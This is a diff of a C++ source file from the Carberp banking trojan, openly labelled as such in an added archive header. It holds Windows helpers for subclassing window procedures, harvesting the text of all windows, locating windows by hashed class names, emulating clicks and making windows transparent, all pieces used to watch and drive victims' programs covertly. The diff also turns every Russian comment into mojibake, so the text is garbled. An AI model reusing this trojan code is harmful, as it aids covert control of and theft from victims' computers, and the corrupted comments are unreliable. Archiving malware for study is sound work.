@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 //---------------------------------------------------------------------------
 
 #include <windows.h>
@@ -12,7 +23,7 @@
 
 void FreeWndProcInfoRec(LPVOID Data)
 {
-	// Уничтожить элемент списка  PWndProcInfo
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ  PWndProcInfo
     FreeStruct(Data);
 }
 //---------------------------------------------------------------------------
@@ -20,7 +31,7 @@ void FreeWndProcInfoRec(LPVOID Data)
 
 bool SubClassingSearcRec(WNDPROCLIST List, HWND Wnd, DWORD *Index, PWndProcInfo *Rec)
 {
-	// Функция ищет запись об оконной процедуре для указанного окна
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 	if (Index != NULL)
 		*Index = 0;
 
@@ -49,7 +60,7 @@ bool SubClassingSearcRec(WNDPROCLIST List, HWND Wnd, DWORD *Index, PWndProcInfo 
 
 WNDPROCLIST SubClassing::CreateList()
 {
-	//	функция создаёт список хранения информации подмененых процедурах.
+	//	пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 	PList L = List::Create();
 	List::SetFreeItemMehod(L, FreeWndProcInfoRec);
 
@@ -59,7 +70,7 @@ WNDPROCLIST SubClassing::CreateList()
 
 PWndProcInfo SubClassing::SetWindowProc(WNDPROCLIST List, HWND Wnd, WNDPROC NewProc)
 {
-	// Функция подменяет оконную процедуру
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 
 	if (List == NULL || Wnd == NULL || NewProc == NULL)
 		return NULL;
@@ -93,7 +104,7 @@ PWndProcInfo SubClassing::SetWindowProc(WNDPROCLIST List, HWND Wnd, WNDPROC NewP
 
 void SubClassing::RestoreWndProc(WNDPROCLIST List, HWND Wnd)
 {
-	// Функция восстанавливает оригинальную оконную процедуру
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 
 	PWndProcInfo Rec;
 	DWORD Index;
@@ -113,7 +124,7 @@ void SubClassing::RestoreWndProc(WNDPROCLIST List, HWND Wnd)
 
 LRESULT SubClassing::CallOriginalProc(WNDPROCLIST List, HWND Wnd, UINT Msg, WPARAM WParam, LPARAM LParam)
 {
-	//  Функция вызывает ориганальную оконную процедуру
+	//  пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	PWndProcInfo Rec;
 	if (!SubClassingSearcRec(List, Wnd, NULL, &Rec))
 		return 0;
@@ -136,7 +147,7 @@ LRESULT SubClassing::CallOriginalProc(WNDPROCLIST List, HWND Wnd, UINT Msg, WPAR
 
 HWND AllocateWND(WNDPROC WndProc)
 {
-	// Функция создаёт окно
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 	if (WndProc == NULL)
 		return NULL;
 
@@ -165,7 +176,7 @@ HWND AllocateWND(WNDPROC WndProc)
 
 PCHAR GetWndText(HWND Wnd)
 {
-	// Функция возвращает текст окна
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 	if (Wnd == NULL)
 		return NULL;
 
@@ -174,7 +185,7 @@ PCHAR GetWndText(HWND Wnd)
 	if (Len == 0)
 		return NULL;
 
-	++Len; // Для завершающего нуля.
+	++Len; // пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ.
 
     PCHAR Str = STR::Alloc(Len);
 
@@ -194,8 +205,8 @@ string GetWndText2(HWND Wnd)
 		if (Len)
 		{
 			Text.SetLength(Len);
-			// При получении текста, для конечного нуля,
-			// длину указываем на один символ больше
+			// пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ,
+			// пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 			pSendMessageA(Wnd, WM_GETTEXT, Len + 1, (LPARAM)Text.t_str());
         }
     }
@@ -207,7 +218,7 @@ string GetWndText2(HWND Wnd)
 
 PCHAR GetWndClassName(HWND Wnd)
 {
-	// Функция возвращает имя класса окна
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 	if (Wnd == NULL)
 		return NULL;
 
@@ -233,7 +244,7 @@ string GetWndClassName2(HWND Wnd)
 
 DWORD GetWndTextHash(HWND Wnd, bool LowerChar)
 {
-	//Возвращает хеш заголовка окна
+	//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 	string Text = GetWndText2(Wnd);
 	if (LowerChar) Text.LowerCase();
 	return Text.Hash();
@@ -242,7 +253,7 @@ DWORD GetWndTextHash(HWND Wnd, bool LowerChar)
 
 DWORD GetWndClassHash(HWND Wnd, bool CaseSensetive)
 {
-	//Возвращает хеш имени класса окна
+	//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 	string S(MAX_PATH);
 	pGetClassNameA(Wnd, S.t_str(), MAX_PATH);
 	return S.Hash(0, CaseSensetive);
@@ -251,9 +262,9 @@ DWORD GetWndClassHash(HWND Wnd, bool CaseSensetive)
 
 //---------------------------------------------------
 //  SameWndTextToHashArray
-//  Функция проверяет надпись окна на предмет
-//  соответствия надписям из списка хэшей
-//  Последний элемент массива должен быть нулевым
+//  пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+//  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
+//  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 //---------------------------------------------------
 bool SameWndTextWithHashArray(HWND Wnd, const DWORD* TextHashArray, bool LowerCase)
 {
@@ -273,9 +284,9 @@ bool SameWndTextWithHashArray(HWND Wnd, const DWORD* TextHashArray, bool LowerCa
 
 bool ClickToWindow(HWND Wnd, int X, int Y)
 {
-	//  Функция эмулирует клик по окну
+	//  пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅ
 
-	/* TODO : Сделать установку координат клика */
+	/* TODO : пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ */
 	if (X == -1) X = 5;
     if (Y == -1) Y = 5;
 	DWORD LParam = MAKELPARAM(X, Y);
@@ -330,7 +341,7 @@ typedef struct TWndTextEnumData
 
 BOOL WINAPI __DoGetWindowText(HWND Wnd, LPARAM Data)
 {
-	// Функция добавляет текст окна в список
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	PWndTextEnumData D = (PWndTextEnumData)Data;
 
 	static const char ClassPrefix[] = {'[', 'C','L','A','S','S',':',' ', 0};
@@ -361,7 +372,7 @@ BOOL WINAPI __DoGetWindowText(HWND Wnd, LPARAM Data)
 
 PCHAR GetAllWindowsText(HWND Wnd, bool AddClass, bool AddText)
 {
-	// Функция собирает надписи всех элементов окна
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 	TWndTextEnumData Info;
 	Info.Captions = Strings::Create();
 	Info.Level = 0;
@@ -376,7 +387,7 @@ PCHAR GetAllWindowsText(HWND Wnd, bool AddClass, bool AddText)
 }
 //---------------------------------------------------------------------------
 
-// Функция устанавливает прозрачность окна
+// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 void SetWindowTransparent(HWND Wnd, BYTE Transparent)
 {
 	DWORD dwStyle = (DWORD)pGetWindowLongA(Wnd, GWL_EXSTYLE );
@@ -389,12 +400,12 @@ void SetWindowTransparent(HWND Wnd, BYTE Transparent)
 
 
 //*************************************************************************
-// WNDFILTER - Методы отбора окон по заданным параметрам
+// WNDFILTER - пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 //*************************************************************************
 
 PWndFilter WNDFILTER::Create(PCHAR ClassName, PCHAR Text, bool IsParentWnd, DWORD MaxLevel)
 {
-	//  Создать фильтр
+	//  пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	PWndFilter F = CreateStruct(TWndFilter);
 	if (F == NULL)
 		return NULL;
@@ -412,7 +423,7 @@ PWndFilter WNDFILTER::Create(PCHAR ClassName, PCHAR Text, bool IsParentWnd, DWOR
 
 void WNDFILTER::Free(PWndFilter Filter)
 {
-	// Уничтожить фильтр
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	if (Filter == NULL)
 		return;
 
@@ -432,8 +443,8 @@ bool WNDFILTER_DoFiltrate(HWND Wnd, PWndFilter Filter, DWORD WndLevel)
 }
 
 //----------------------------------------------------------
-//  Filtrate -  Функция проверяет удовлетворяет ли окно
-//			    заданному фильтру
+//  Filtrate -  пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅ
+//			    пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 //----------------------------------------------------------
 bool WNDFILTER::Filtrate(HWND Wnd, PWndFilter Filter)
 {
@@ -447,7 +458,7 @@ bool WNDFILTER::Filtrate(HWND Wnd, PWndFilter Filter)
 
 //--------------------------------------------------------------------------
 
-//структура хранения параметров функции FindWndByClassHashArray
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ FindWndByClassHashArray
 struct Param_FindWndByClassHashArray
 {
 	DWORD* Hashes;
@@ -469,7 +480,7 @@ static BOOL CALLBACK EnumChildProcForHashArray( HWND hwnd, LPARAM lParam )
 			if( res )
 			{
 				param->finded = res;
-				ret = FALSE; //останавливаем поиск
+				ret = FALSE; //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 			}
 		}
 	}
@@ -481,9 +492,9 @@ HWND FindWndByClassHashArray(HWND ParentWnd, DWORD* Hashes, bool CaseSensetive)
 {
 	if( Hashes )
 	{
-		if( *Hashes ) //есть еще хеши, ищем дальше
+		if( *Hashes ) //пїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 		{
-			//сохраняем параметры для функции перебора дочерних окон
+			//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 			Param_FindWndByClassHashArray param;
 			param.Hashes = Hashes;
 			param.CaseSensetive = CaseSensetive;
@@ -491,7 +502,7 @@ HWND FindWndByClassHashArray(HWND ParentWnd, DWORD* Hashes, bool CaseSensetive)
 			pEnumChildWindows( ParentWnd, EnumChildProcForHashArray, (LPARAM)&param );
 			return param.finded;
 		}
-		else //хеши закончились, значит переданное окно и есть искомое
+		else //пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 			return ParentWnd;
 	}
 	return NULL;
